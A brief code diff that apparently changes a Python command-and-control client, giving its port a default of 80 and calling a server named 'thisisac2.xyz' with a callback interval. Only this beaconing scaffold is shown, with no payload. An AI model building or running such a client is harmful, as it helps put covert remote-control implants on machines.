@@ -6,7 +6,7 @@ import platform
 
 class Client:
 
-    def __init__(self,server_ip, port,callback_interval=120):
+    def __init__(self,server_ip, port=80,callback_interval=120):
         self.server_ip = server_ip
         self.port = port
         self.callback_interval = callback_interval
@@ -75,7 +75,7 @@ class Client:
                 #print(e)
 
 def main():
-    client = Client("thisisac2.xyz", 80)
+    client = Client("thisisac2.xyz")
     client.run()
 
 if __name__ == '__main__':
